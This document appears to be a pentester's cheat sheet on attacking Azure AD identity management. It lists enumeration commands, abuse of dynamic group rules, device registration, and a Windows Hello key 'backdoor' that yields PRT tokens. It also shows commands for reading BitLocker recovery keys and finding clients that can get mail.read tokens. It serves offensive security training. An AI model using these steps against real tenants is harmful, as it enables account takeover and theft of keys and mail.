# Azure AD IAM

> Root Management Group (Tenant) > Management Group > Subscription > Resource Group > Resource

* Users
* Devices
* Service Principals (Application and Managed Identities)

## Users

* List users: `Get-AzureADUser -All $true`
* Enumerate groups

    ```ps1
    # List groups
    Get-AzureADGroup -All $true
    
    # Get members of a group
    Get-AzADGroup -DisplayName '<GROUP-NAME>'
    Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName
    ```

* Enumerate roles: `Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember`
* List roles: `Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName`
* Add user to a group

    ```ps1
    $groupid = "<group-id>"
    $targetmember = "<user-id>"
    $group = Get-MgGroup -GroupId $groupid
    $members = Get-MgGroupMember -GroupId $groupid
    New-MgGroupMember -GroupId $groupid -DirectoryObjectid $targetmember
    ```

### Use Credentials

### Dynamic Group Membership

Get groups that allow Dynamic membership: `Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`

Rule example : `(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`     
Rule description: Any Guest user whose secondary email contains the string 'vendor' will be added to the group

1. Open user's profile, click on **Manage**
2. Click on **Resend** invite and to get an invitation URL
3. Set the secondary email
    ```powershell
    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
    ```

## Devices

### List Devices

```ps1
Connect-AzureAD
Get-AzureADDevice
$user = Get-AzureADUser -SearchString "username"
Get-AzureADUserRegisteredDevice -ObjectId $user.ObjectId -All $true
```


### Device State

```ps1
PS> dsregcmd.exe /status
+----------------------------------------------------------------------+
| Device State |
+----------------------------------------------------------------------+
 AzureAdJoined : YES
 EnterpriseJoined : NO
 DomainJoined : NO
 Device Name : jumpvm
```


### Join Devices

* [Enroll Windows 10/11 devices in Intune](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)


### Register Devices

```ps1
roadtx device -a register -n swkdeviceup
```


### Windows Hello for Business

```ps1
roadtx.exe prtenrich --ngcmfa-drs-auth
roadtx.exe winhello -k swkdevicebackdoor.key
roadtx.exe prt -hk swkdevicebackdoor.key -u <user@domain.lab> -c swkdeviceup.pem -k swkdeviceup.key
roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
```


### Bitlocker Keys

```ps1
Install-Module Microsoft.Graph -Scope CurrentUser
Import-Module Microsoft.Graph.Identity.SignIns
Connect-MgGraph -Scopes BitLockerKey.Read.All
Get-MgInformationProtectionBitlockerRecoveryKey -All
Get-MgInformationProtectionBitlockerRecoveryKey -BitlockerRecoveryKeyId $bitlockerRecoveryKeyId
```


# Service Principals


## Other

Lists all the client IDs you can use to get a token with the `mail.read` scope on the Microsoft Graph:

```ps1
roadtx getscope -s https://graph.microsoft.com/mail.read
roadtx findscope -s https://graph.microsoft.com/mail.read
```


## References

* [Pentesting Azure Mindmap](https://github.com/synacktiv/Mindmaps)
